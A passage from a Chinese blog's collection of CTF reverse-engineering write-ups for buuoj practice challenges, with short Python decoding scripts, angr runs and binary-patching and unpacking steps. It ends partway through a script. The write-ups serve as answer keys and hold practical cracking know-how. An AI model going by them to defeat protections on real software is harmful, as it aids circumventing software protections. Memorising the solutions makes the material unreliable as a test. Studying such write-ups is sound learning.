class="number">0xFE</span>, <span class="number">0xB9</span>, <span class="number">0x85</span>,</span><br><span class="line"><span class="number">0xB6</span>, <span class="number">0xD9</span>, <span class="number">0xDE</span>, <span class="number">0x7B</span>, <span class="number">0xCF</span>, <span class="number">0x4F</span>, <span class="number">0xB3</span>, <span class="number">0xD5</span>, <span class="number">0x08</span>, <span class="number">0x7C</span>,</span><br><span class="line"><span class="number">0x0A</span>, <span class="number">0x71</span>, <span class="number">0x12</span>, <span class="number">0x06</span>, <span class="number">0x37</span>, <span class="number">0xFF</span>, <span class="number">0x7F</span>, <span class="number">0xB7</span>, <span class="number">0x46</span>, <span class="number">0x42</span>,</span><br><span class="line"><span class="number">0x25</span>, <span class="number">0xC9</span>, <span class="number">0xD0</span>, <span class="number">0x50</span>, <span class="number">0x52</span>, <span class="number">0xCE</span>, <span class="number">0xBD</span>, <span class="number">0x6C</span>, <span class="number">0xE5</span>, <span class="number">0x6F</span>,</span><br><span class="line"><span class="number">0xA5</span>, <span class="number">0x15</span>, <span class="number">0xED</span>, <span class="number">0x64</span>, <span class="number">0xF0</span>, <span class="number">0x23</span>, <span class="number">0x35</span>, <span class="number">0xE7</span>, <span class="number">0x0C</span>, <span class="number">0x61</span>,</span><br><span class="line"><span class="number">0xA4</span>, <span class="number">0xD7</span>, <span class="number">0x51</span>, <span class="number">0x75</span>, <span class="number">0x9A</span>, <span class="number">0xF2</span>, <span class="number">0x1E</span>, <span class="number">0xEB</span>, <span class="number">0x58</span>, <span class="number">0xF1</span>,</span><br><span class="line"><span class="number">0x94</span>, <span class="number">0xC3</span>, <span class="number">0x2F</span>, <span class="number">0x56</span>, <span class="number">0xF7</span>, <span class="number">0xE6</span>, <span class="number">0x86</span>, <span class="number">0x47</span>, <span class="number">0xFB</span>, <span class="number">0x83</span>,</span><br><span class="line"><span class="number">0x5E</span>, <span class="number">0xCC</span>, <span class="number">0x21</span>, <span class="number">0x4A</span>, <span class="number">0x24</span>, <span class="number">0x07</span>, <span class="number">0x1C</span>, <span class="number">0x8A</span>, <span class="number">0x5A</span>, <span class="number">0x17</span>,</span><br><span class="line"><span class="number">0x1B</span>, <span class="number">0xDA</span>, <span class="number">0xEC</span>, <span class="number">0x38</span>, <span class="number">0x0E</span>, <span class="number">0x7E</span>, <span class="number">0xB4</span>, <span class="number">0x48</span>, <span class="number">0x88</span>, <span class="number">0xF4</span>,</span><br><span class="line"><span class="number">0xB8</span>, <span class="number">0x27</span>, <span class="number">0x91</span>, <span class="number">0x00</span>, <span class="number">0x13</span>, <span class="number">0x97</span>, <span class="number">0xBE</span>, <span class="number">0x53</span>, <span class="number">0xC2</span>, <span class="number">0xE8</span>,</span><br><span class="line"><span class="number">0xEA</span>, <span class="number">0x1A</span>, <span class="number">0xE9</span>, <span class="number">0x2D</span>, <span class="number">0x14</span>, <span class="number">0x0B</span>, <span class="number">0xBF</span>, <span class="number">0xB5</span>, <span class="number">0x40</span>, <span class="number">0x79</span>,</span><br><span class="line"><span class="number">0xD2</span>, <span class="number">0x3E</span>, <span class="number">0x19</span>, <span class="number">0x5D</span>, <span class="number">0xF8</span>, <span class="number">0x69</span>, <span class="number">0x39</span>, <span class="number">0x5F</span>, <span class="number">0xDB</span>, <span class="number">0xFA</span>,</span><br><span class="line"><span class="number">0xB2</span>, <span class="number">0x8B</span>, <span class="number">0x6E</span>, <span class="number">0xA2</span>, <span class="number">0xDF</span>, <span class="number">0x16</span>, <span class="number">0xE2</span>, <span class="number">0x63</span>, <span class="number">0xB1</span>, <span class="number">0x20</span>,</span><br><span class="line"><span class="number">0xCB</span>, <span class="number">0xBA</span>, <span class="number">0xEE</span>, <span class="number">0x8D</span>, <span class="number">0xAA</span>, <span class="number">0xC8</span>, <span class="number">0xC7</span>, <span class="number">0xC5</span>, <span class="number">0x05</span>, <span class="number">0x66</span>,</span><br><span class="line"><span class="number">0x6D</span>, <span class="number">0x3A</span>, <span class="number">0x45</span>, <span class="number">0x72</span>, <span class="number">0x0D</span>, <span class="number">0xCA</span>, <span class="number">0x84</span>, <span class="number">0x4E</span>, <span class="number">0xF5</span>, <span class="number">0x31</span>,</span><br><span class="line"><span class="number">0x6B</span>, <span class="number">0x92</span>, <span class="number">0xDC</span>, <span class="number">0xDD</span>, <span class="number">0x9C</span>, <span class="number">0x3F</span>, <span class="number">0x55</span>, <span class="number">0x96</span>, <span class="number">0xA1</span>, <span class="number">0x9F</span>,</span><br><span class="line"><span class="number">0xCD</span>, <span class="number">0x9B</span>, <span class="number">0xE3</span>, <span class="number">0xA0</span>, <span class="number">0xA7</span>, <span class="number">0xFC</span>, <span class="number">0xC1</span>, <span class="number">0x78</span>, <span class="number">0x10</span>, <span class="number">0x2E</span>,</span><br><span class="line"><span class="number">0x82</span>, <span class="number">0x8F</span>, <span class="number">0x30</span>, <span class="number">0x54</span>, <span class="number">0x04</span>, <span class="number">0xAC</span>, <span class="number">0x41</span>, <span class="number">0x93</span>, <span class="number">0xD3</span>, <span class="number">0x3B</span>,</span><br><span class="line"><span class="number">0xEF</span>, <span class="number">0x03</span>, <span class="number">0x81</span>, <span class="number">0x70</span>, <span class="number">0xA6</span>, <span class="number">0x1F</span>, <span class="number">0x22</span>, <span class="number">0x26</span>, <span class="number">0x28</span>, <span class="number">0x6A</span>,</span><br><span class="line"><span class="number">0xAB</span>, <span class="number">0x87</span>, <span class="number">0xAD</span>, <span class="number">0x49</span>, <span class="number">0x0F</span>, <span class="number">0xAF</span>]</span><br><span class="line">target = [<span class="number">0x30</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">0x30</span>, <span class="number">0x63</span>, <span class="number">0x90</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">idx = table.index(target[i])</span><br><span class="line">s2 += <span class="built_in">chr</span>(idx ^ (<span class="number">0x83</span> + i))</span><br><span class="line"><span class="built_in">print</span> s2</span><br></pre></td></tr></table></figure><p>再次返回 main 函数，比较第三段：</p><p><img src="../img/ACTF%E6%96%B0%E7%94%9F%E8%B5%9B2020Splendid_MineCraft/1.png" alt="ACTF新生赛2020Splendid_MineCraft"></p><p>拼接起来得到 flag</p><br><h3 id="De1CTF2019-Re-Sign-x86-exe-upx-base64"><a href="#De1CTF2019-Re-Sign-x86-exe-upx-base64" class="headerlink" title="[De1CTF2019]Re_Sign | x86,exe,upx,base64"></a>[De1CTF2019]Re_Sign | x86,exe,upx,base64</h3><p>upx 提供的工具脱不了壳，手动脱壳，OEP 在 0x405012，查找字符串 “Success” 的交叉引用来到函数 sub_401000：</p><p><img src="../img/De1CTF2019Re_Sign/1.png" alt="De1CTF2019Re_Sign"></p><p>在 0x4016F5 下断点可以获取改变后的 base 编码表（[ebp-0x20]）：</p><p><img src="../img/De1CTF2019Re_Sign/2.png" alt="De1CTF2019Re_Sign"></p><p>然后通过动调获得目标数组（元素为各字符相较于正常编码表的偏移，下标从 1 开始），解题脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">ori = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&quot;</span></span><br><span class="line">new = <span class="string">&quot;0123456789QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm+/=&quot;</span></span><br><span class="line">target = [<span class="number">8</span>, <span class="number">0x3B</span>, <span class="number">1</span>, <span class="number">0x20</span>, <span class="number">7</span>, <span class="number">0x34</span>, <span class="number">9</span>, <span class="number">0x1F</span>, <span class="number">0x18</span>, <span class="number">0x24</span>,</span><br><span class="line"><span class="number">0x13</span>, <span class="number">3</span>, <span class="number">0x10</span>, <span class="number">0x38</span>, <span class="number">9</span>, <span class="number">0x1B</span>, <span class="number">8</span>, <span class="number">0x34</span>, <span class="number">0x13</span>, <span class="number">2</span>,</span><br><span class="line"><span class="number">8</span>, <span class="number">0x22</span>, <span class="number">0x12</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">0x12</span>, <span class="number">3</span>, <span class="number">0xF</span>, <span class="number">0x22</span>, <span class="number">0x12</span>,</span><br><span class="line"><span class="number">0x17</span>, <span class="number">8</span>, <span class="number">1</span>, <span class="number">0x29</span>, <span class="number">0x22</span>, <span class="number">6</span>, <span class="number">0x24</span>, <span class="number">0x32</span>, <span class="number">0x24</span>, <span class="number">0xF</span>,</span><br><span class="line"><span class="number">0x1F</span>, <span class="number">0x2B</span>, <span class="number">0x24</span>, <span class="number">3</span>, <span class="number">0x15</span>, <span class="number">0x41</span>, <span class="number">0x41</span>]</span><br><span class="line">f1 = <span class="keyword">lambda</span> x : ori[x - <span class="number">1</span>]</span><br><span class="line">tmp = <span class="built_in">map</span>(f1, target)</span><br><span class="line"></span><br><span class="line">f2 = <span class="keyword">lambda</span> x : ori[new.index(x)]</span><br><span class="line">bflag = <span class="built_in">map</span>(f2, tmp)</span><br><span class="line"><span class="built_in">print</span> base64.b64decode(<span class="string">&#x27;&#x27;</span>.join(bflag))</span><br></pre></td></tr></table></figure><br><h3 id="watevrCTF-2019-Timeout-x86-elf"><a href="#watevrCTF-2019-Timeout-x86-elf" class="headerlink" title="[watevrCTF 2019]Timeout | x86,elf"></a>[watevrCTF 2019]Timeout | x86,elf</h3><p>generate 函数里 puts 输出的就是 flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a = [<span class="number">119</span>, <span class="number">97</span>, <span class="number">116</span>, <span class="number">101</span>, <span class="number">118</span>, <span class="number">114</span>, <span class="number">123</span>, <span class="number">51</span>, <span class="number">110</span>, <span class="number">99</span>, <span class="number">114</span>, <span class="number">121</span>, <span class="number">116</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">110</span>, <span class="number">95</span>, <span class="number">105</span>, <span class="number">115</span>, <span class="number">95</span>, <span class="number">111</span>, <span class="number">118</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">114</span>, <span class="number">97</span>, <span class="number">116</span>, <span class="number">101</span>, <span class="number">100</span>, <span class="number">95</span>, <span class="number">121</span>, <span class="number">111</span>, <span class="number">117</span>, <span class="number">116</span>, <span class="number">117</span>, <span class="number">98</span>, <span class="number">101</span>, <span class="number">46</span>, <span class="number">99</span>, <span class="number">111</span>, <span class="number">109</span>, <span class="number">47</span>, <span class="number">119</span>, <span class="number">97</span>, <span class="number">116</span>, <span class="number">99</span>, <span class="number">104</span>, <span class="number">63</span>, <span class="number">118</span>, <span class="number">61</span>, <span class="number">79</span>, <span class="number">80</span>, <span class="number">102</span>, <span class="number">48</span>, <span class="number">89</span>, <span class="number">98</span>, <span class="number">88</span>, <span class="number">113</span>, <span class="number">68</span>, <span class="number">109</span>, <span class="number">48</span>, <span class="number">125</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">chr</span>, a))</span><br></pre></td></tr></table></figure><br><h3 id="CISCN2018-2ex-mips-elf-base64"><a href="#CISCN2018-2ex-mips-elf-base64" class="headerlink" title="[CISCN2018]2ex | mips,elf,base64"></a>[CISCN2018]2ex | mips,elf,base64</h3><p>简单的替换编码表的变种 base64</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">new = <span class="string">&#x27;@,.1fgvw#`/2ehux$~&quot;3dity%_;4cjsz^+&#123;5bkrA&amp;=&#125;6alqB*-[70mpC()]89noD&#x27;</span></span><br><span class="line">old = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span></span><br><span class="line">out = <span class="string">&quot;_r-+_Cl5;vgq_pdme7#7eC0=&quot;</span></span><br><span class="line">func = <span class="keyword">lambda</span> x : <span class="string">&#x27;=&#x27;</span> <span class="keyword">if</span> x == <span class="string">&#x27;=&#x27;</span> <span class="keyword">else</span> old[new.index(x)]</span><br><span class="line"></span><br><span class="line">bflag = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(func, out))</span><br><span class="line"><span class="built_in">print</span> base64.b64decode(bflag)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> 逆向 </tag>
            
            <tag> Writeup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuoj 逆向刷题之旅（二）</title>
      <link href="/2020/11/28/buuoj-%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98%E4%B9%8B%E6%97%85%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
      <url>/2020/11/28/buuoj-%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98%E4%B9%8B%E6%97%85%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<p>以下是本文涉及到的关键词：</p><ul><li>架构：x86, JVM</li><li>文件类型：exe, elf, apk</li><li>考点：vm虚拟机, angr, 图形界面, 花指令, 二叉树, java层, .NET, Unity游戏, hook, Windows异常机制, sm4, ollvm平坦化, 虚假控制流, 数独, apk加固, 栈溢出, 变种base64, 反调试, SMC, AES</li></ul><p>PS. 用到的 python 脚本运行环境<strong>除特殊标注外均为 python2</strong>，<strong>如果内容有误或者图片缺失，欢迎联系我修正</strong>。</p><p>好耶！φ(&gt;ω&lt;*) </p><iframe frameborder="0" border="1"    marginwidth="0" marginheight="0"    width=100% height=105    src="//music.163.com/outchain/player?type=2&id=513336178&auto=0&height=60"></iframe><br><h3 id="GWCTF-2019-babyvm-x86-elf-vm虚拟机-angr"><a href="#GWCTF-2019-babyvm-x86-elf-vm虚拟机-angr" class="headerlink" title="[GWCTF 2019]babyvm | x86,elf,vm虚拟机,angr"></a>[GWCTF 2019]babyvm | x86,elf,vm虚拟机,angr</h3><p>出题人上来就写了一个虚拟机，很复杂啊：</p><p><img src="../img/GWCTF2019babyvm/1.png" alt="GWCTF2019babyvm"></p><p>我不讲武德直接上 angr</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"></span><br><span class="line">base_addr = <span class="number">0x400000</span></span><br><span class="line">project = angr.Project(<span class="string">&quot;attachment&quot;</span>, </span><br><span class="line">auto_load_libs = <span class="literal">False</span>,</span><br><span class="line">main_opts=&#123;<span class="string">&quot;base_addr&quot;</span>:base_addr&#125;)</span><br><span class="line"></span><br><span class="line"><span class="meta">@project.hook(<span class="params">base_addr+<span class="number">0x1081</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Hook</span>(<span class="params">state</span>):</span></span><br><span class="line"><span class="built_in">print</span>(state.posix.dumps(<span class="number">0</span>))</span><br><span class="line">project.terminate_execution()</span><br><span class="line"></span><br><span class="line">project.execute()</span><br></pre></td></tr></table></figure><p>跑出来个假的 flag：</p><p><img src="../img/GWCTF2019babyvm/2.png" alt="GWCTF2019babyvm"></p><p>放到 ubuntu 上运行：</p><p><img src="../img/GWCTF2019babyvm/3.png" alt="GWCTF2019babyvm"></p><p>没毛病啊，那这个小伙子才是真的不讲武德，敢用假 flag 和假 code，这好么，这不好。从 Vm_Run 函数可以得知，运行结束的条件是碰到 0xF4：</p><p><img src="../img/GWCTF2019babyvm/4.png" alt="GWCTF2019babyvm"></p><p>那就翻翻 unk_202060：</p><p><img src="../img/GWCTF2019babyvm/5.png" alt="GWCTF2019babyvm"></p><p>原来真正的 code 藏在 0x202180 了，那就把 Vm_Run 中的 0x202060 patch 成 0x202180：</p><p><img src="../img/GWCTF2019babyvm/6.png" alt="GWCTF2019babyvm"></p><p>同时 Check_Flag 函数也是假的，与之相似的函数还有一个 sub_F00，把 main 函数检查 flag 的函数也 patch 成 sub_F00：</p><p><img src="../img/GWCTF2019babyvm/7.png" alt="GWCTF2019babyvm"></p><p>再用 angr 跑一遍（脚本不用改），得到真正的 flag</p><br><h3 id="HDCTF2019-MFC-x86-exe-图形界面"><a href="#HDCTF2019-MFC-x86-exe-图形界面" class="headerlink" title="[HDCTF2019]MFC | x86,exe,图形界面"></a>[HDCTF2019]MFC | x86,exe,图形界面</h3><p>ExeInfo PE 查一下，发现被 VMProtect 加壳了：</p><p><img src="../img/HDCTF2019MFC/1.png" alt="HDCTF2019MFC"></p><p>不急着脱壳，毕竟 VM 的壳不好脱，运行起来：</p><p><img src="../img/HDCTF2019MFC/2.png" alt="HDCTF2019MFC"></p><p>好家伙，谜语人。<a href="https://pan.baidu.com/s/19aVPiTYHa00oC8aFjbSkxg">xspy</a>（提取码 f93p）探一下最外层的窗口，发现一个奇怪的类名和奇怪的消息回调：</p><p><img src="../img/HDCTF2019MFC/3.png" alt="HDCTF2019MFC"></p><p>C++ 写个程序，给窗口 0x210ADE（窗口句柄，每次运行都会改变）发个 0x464 消息：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">PostMessage</span>((HWND)<span class="number">0x210ADE</span>, <span class="number">0x464</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>得到一个 key：</p><p><img src="../img/HDCTF2019MFC/4.png" alt="HDCTF2019MFC"></p><p>所以刚才的奇怪类名就是 DES 密文咯，找个在线网站解密：</p><p><img src="../img/HDCTF2019MFC/5.png" alt="HDCTF2019MFC"></p><br><h3 id="findKey-x86-exe-图形界面-花指令"><a href="#findKey-x86-exe-图形界面-花指令" class="headerlink" title="findKey | x86,exe,图形界面,花指令"></a>findKey | x86,exe,图形界面,花指令</h3><p>找到 WinMain，注册了一个类：</p><p><img src="../img/findKey/1.png" alt="findKey"></p><p>点进去，找到窗口函数 loc_401640：</p><p><img src="../img/findKey/2.png" alt="findKey"></p><p>该函数存在花指令，按 P 无法直接创建函数，下方 Output window 提示 0x40191F 处解析失败，检查一下：</p><p><img src="../img/findKey/3.png" alt="findKey"></p><p>把 jmp 给 nop 掉，在 0x401640 处按 P 创建函数并 F5，首先观察他的 else 分支：</p><p><img src="../img/findKey/4.png" alt="findKey"></p><p>如果到来的消息是 WM_COMMAND，且 wParam 是 104 的话，就会用 Dialog 模板（编号 103）创建一个对话框，对应的窗口函数是 DialogFunc。Resource Hacker 打开，找到 104 对应的菜单为 About：</p><p><img src="../img/findKey/5.png" alt="findKey"></p><p>其 Dialog 模板也说明弹出的对话框是 <strong>关于</strong>：</p><p><img src="../img/findKey/6.png" alt="findKey"></p><p>窗口函数 DialogFunc：</p><p><img src="../img/findKey/7.png" alt="findKey"></p><p>也就是说，如果在关于对话框中按左/中/右键，input 数组就会被逐字节赋值为字符 1/2/3。再回到 0x401640 函数的 if 分支：</p><p><img src="../img/findKey/8.png" alt="findKey"></p><p>XorDecrypt 函数逻辑很简单，这里直接给脚本，将 cipher 还原一下（也可以动调）：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">XorDecrypt</span>(<span class="params">key, cipher</span>):</span></span><br><span class="line">key = <span class="built_in">map</span>(<span class="built_in">ord</span>, key)</span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cipher)):</span><br><span class="line">res += <span class="built_in">chr</span>(cipher[i] ^ key[i % <span class="built_in">len</span>(key)])</span><br><span class="line"><span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">key1 = <span class="string">&quot;SS&quot;</span></span><br><span class="line">cipher = <span class="string">&quot;0kk`d1a`55k222k2a776jbfgd`06cjjb&quot;</span></span><br><span class="line">cipher = <span class="built_in">map</span>(<span class="built_in">ord</span>, cipher)</span><br><span class="line"><span class="built_in">print</span> XorDecrypt(key1, cipher)</span><br><span class="line"><span class="comment"># c8837b23ff8aaa8a2dde915473ce0991</span></span><br></pre></td></tr></table></figure><p>将得到的结果拿去 <a href="https://www.cmd5.com/">网站</a> 查询，得到 md5 前是 123321。至于为什么那个函数是 md5，你可以点进去，来到函数 sub_4013A0，里面有这么一行：</p><p><img src="../img/findKey/9.png" alt="findKey"></p><p>CryptCreateHash 第二个参数是 0x8003，该宏可以在 <a href="https://docs.microsoft.com/en-us/windows/win32/seccrypto/alg-id">MSDN</a> 找到，为 CALG_MD5</p><p>剩下的你可以接着用脚本，把 unk_423030 拿出来，用 123321 作为 key，XorDecrypt 一下得到 flag：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">key2 = <span class="string">&quot;123321&quot;</span></span><br><span class="line">target = <span class="string">&quot;57 5E 52 54 49 5F 01 6D 69 46 02 6E 5F 02 6C 57 5B 54 4C&quot;</span>.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">target = [<span class="built_in">int</span>(i, <span class="number">16</span>) <span class="keyword">for</span> i <span class="keyword">in</span> target]</span><br><span class="line"><span class="built_in">print</span> XorDecrypt(key2, target)</span><br></pre></td></tr></table></figure><p>也可以让程序自己弹出 flag。input 数组是 123321 的话，在 Help -&gt; About 对话框中空白处应该依次单击鼠标 <strong>左、中、右、右、中、左</strong> 键，关闭 About 对话框（OK 或者 × 都行），再在主界面空白处单击鼠标右键：</p><p><img src="../img/findKey/10.png" alt="findKey"></p><br><h3 id="ACTF新生赛2020-SoulLike-x86-elf-angr"><a href="#ACTF新生赛2020-SoulLike-x86-elf-angr" class="headerlink" title="[ACTF新生赛2020]SoulLike | x86,elf,angr"></a>[ACTF新生赛2020]SoulLike | x86,elf,angr</h3><p>最简单的方式是让你的 5800X 起床干活</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"></span><br><span class="line">base_addr = <span class="number">0x400000</span></span><br><span class="line">project = angr.Project(<span class="string">&quot;SoulLike&quot;</span>,</span><br><span class="line">auto_load_libs=<span class="literal">False</span>,</span><br><span class="line">main_opts=&#123;<span class="string">&quot;base_addr&quot;</span>:base_addr&#125;)</span><br><span class="line"></span><br><span class="line"><span class="meta">@project.hook(<span class="params">base_addr + <span class="number">0x1117D</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Hook</span>(<span class="params">state</span>):</span></span><br><span class="line"><span class="built_in">print</span>(state.posix.dumps(<span class="number">0</span>))</span><br><span class="line">project.terminate_execution()</span><br><span class="line"></span><br><span class="line">project.execute()</span><br></pre></td></tr></table></figure><p>大概 20s 出结果。当然，因为程序本身也会告诉你输入的 flag 错在了哪一位，也可以写个 python 脚本来爆破，用 os.popen + 输入重定向</p><br><h3 id="FlareOn5-Ultimate-Minesweeper-x86-exe-NET"><a href="#FlareOn5-Ultimate-Minesweeper-x86-exe-NET" class="headerlink" title="[FlareOn5]Ultimate Minesweeper | x86,exe,.NET"></a>[FlareOn5]Ultimate Minesweeper | x86,exe,.NET</h3><p>ExeInfo PE 打开，得知是个 .NET 框架的程序，于是用 dnspy 打开，在所有的类中找到了一个叫 SuccessPopup 的玩意儿：</p><p><img src="../img/FlareOn5UltimateMinesweeper/1.png" alt="FlareOn5UltimateMinesweeper"></p><p>Ctrl+Shift+R 分析一下，发现他被实例化在 MainForm 类中：</p><p><img src="../img/FlareOn5UltimateMinesweeper/2.png" alt="FlareOn5UltimateMinesweeper"></p><p>跟过去：<br><img src="../img/FlareOn5UltimateMinesweeper/3.png" alt="FlareOn5UltimateMinesweeper"></p><p>那就看看这个 TotalUnrevealedEmptySquares 属性，就一个 get 方法，在获取的时候会去检查是不是非雷的都点了：</p><p><img src="../img/FlareOn5UltimateMinesweeper/4.png" alt="FlareOn5UltimateMinesweeper"></p><p>同时注意到有一个可疑的数组 MinesVisible，看这名字应该和控制所有方块是否显示（里面是啥）有关。同样 Ctrl+Shift+R 对这个数组进行分析，看看啥时候被赋的值：</p><p><img src="../img/FlareOn5UltimateMinesweeper/5.png" alt="FlareOn5UltimateMinesweeper"></p><p>就只有这里进行了初始化，并全初始化为了 false（全不可见）：</p><p><img src="../img/FlareOn5UltimateMinesweeper/6.png" alt="FlareOn5UltimateMinesweeper"></p><p>Ctrl+Shift+E 尝试把这里 patch 一下，每个元素都赋值为 true：</p><p><img src="../img/FlareOn5UltimateMinesweeper/7.png" alt="FlareOn5UltimateMinesweeper"></p><p>点击右下角编译，然后 Ctrl+Shift+S 保存 -&gt; 确定，再运行：</p><p><img src="../img/FlareOn5UltimateMinesweeper/8.png" alt="FlareOn5UltimateMinesweeper"></p><p>不管运行多少次都是固定的三个方块没雷，直接点击发现没有效果，应该是点击的回调函数里判断了方块是否可见，可见就表明已经被点开，不会进行其他操作。那就记下这三个方块的坐标，重新解压一下附件，在没有patch 过的程序里点击这三个方块，得到 flag。</p><br><h3 id="UTCTF2020-basic-re-x86-elf"><a href="#UTCTF2020-basic-re-x86-elf" class="headerlink" title="[UTCTF2020]basic-re | x86,elf"></a>[UTCTF2020]basic-re | x86,elf</h3><p>shift + F12</p><br><h3 id="WUSTCTF2020-level4-x86-elf-二叉树"><a href="#WUSTCTF2020-level4-x86-elf-二叉树" class="headerlink" title="[WUSTCTF2020]level4 | x86,elf,二叉树"></a>[WUSTCTF2020]level4 | x86,elf,二叉树</h3><p>总体分析程序逻辑，大致可以猜测与二叉树的遍历有关。由 main 开头的提示，得知用到的结构体有三个字段，在 IDA 的结构体视窗中创建 node 结构体：</p><p><img src="../img/WUSTCTF2020level4/1.png" alt="WUSTCTF2020level4"></p><p>第一个字段实际上只用一个字节（char），由于内存对齐让其占用了 8 个字节，该字段存放结点的数据（一个 ascii 字符），其余两个字段分别是左、右后继结点的指针。现在再看 type1 函数，将函数参数类型修改为定义的 node 结构体指针，可以发现是一个很显然的 左-中-右 中序遍历：</p><p><img src="../img/WUSTCTF2020level4/2.png" alt="WUSTCTF2020level4"></p><p>进一步还原 main 函数符号：</p><p><img src="../img/WUSTCTF2020level4/3.png" alt="WUSTCTF2020level4"></p><p>直接运行得到中序和后序遍历的结果：</p><p><img src="../img/WUSTCTF2020level4/4.png" alt="WUSTCTF2020level4"></p><p>众所周知，已知中序和其他任意序可以唯一确定一个二叉树，具体方法详见 <a href="https://jingyan.baidu.com/article/cdddd41cb8d79753ca00e144.html">百度经验</a>，将树构建出来：</p><p><img src="../img/WUSTCTF2020level4/5.png" alt="WUSTCTF2020level4"></p><p>前序遍历得到 flag</p><p>PS. 如果不会通过中序、后序序列构建树，也可以动态调试。在 init 函数调用结束后（0x40086B）下断点，通过根节点（0x601290）找到所有的后继节点：</p><p><img src="../img/WUSTCTF2020level4/6.png" alt="WUSTCTF2020level4"></p><br><h3 id="SCTF2019-Strange-apk-JVM-apk-java层"><a href="#SCTF2019-Strange-apk-JVM-apk-java层" class="headerlink" title="[SCTF2019]Strange apk | JVM,apk,java层"></a>[SCTF2019]Strange apk | JVM,apk,java层</h3><p>jadx 打开，找到 sctf.hello.c 类，发现其重写了 attachBaseContext 方法，该方法同 onCreate 一样，会在 Application 实例化过程中被自动调用，并且调用时间早于 onCreate 方法：</p><p><img src="../img/SCTF2019Strangeapk/1.png" alt="SCTF2019Strangeapk"></p><p>该函数可疑在后面使用 DexClassLoader 从别的 dex 中加载了类，分析一下可疑部分创建的新文件干了什么</p><p><img src="../img/SCTF2019Strangeapk/2.png" alt="SCTF2019Strangeapk"></p><p>简单来说就是将 assets 目录下的 data 文件内容全部读出，拿来与 syclover 异或。那就把 data 从 apk 中取出，python 处理一下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 